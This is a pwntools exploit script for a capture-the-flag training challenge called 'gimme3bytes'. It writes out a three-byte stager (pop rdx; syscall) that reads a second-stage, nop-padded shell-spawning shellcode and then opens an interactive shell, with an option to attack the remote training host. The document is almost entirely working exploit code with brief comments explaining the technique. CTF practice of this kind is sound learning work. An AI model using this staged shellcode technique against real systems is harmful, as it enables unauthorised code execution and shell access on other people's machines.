from pwn import *

# asks for 3 bytes, with them we can perform a read to get the real shellcode

# the * before the address means to gdb "address" (duh) instead of "symbol" (like the main function)
context.arch = "amd64"
spawner = shellcraft.amd64.linux.sh()
arg = asm(spawner)
COMMANDS = """
b  main
c
"""

if args.REMOTE:
    c = remote("gimmie3bytes.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./gimme3bytes", gdbscript = COMMANDS)
    else:
        c = process("./gimme3bytes")

# 3 bytes are:
# + pop rdx [1 byte] to have a number of bits to read which makes sense
# + syscall [2 bytes] to read from stdin and write in the same buffer as where the last 3 bytes have been written
# all read parameters are already set apart from the length, so we have to pop it
sh1 = """
pop rdx
syscall
"""

# the 3 initial nops are to overwrite pop rdx and syscall (last three bytes) and to guarantee the crafted shellcode starts with the correct instruction (and not the third one, if there weren't the 3 nops)
sh2 = """
nop
nop
nop
""" + shellcraft.sh()
sha = asm(sh2)
c.send(asm(sh1))
c.send(sha)
c.interactive()
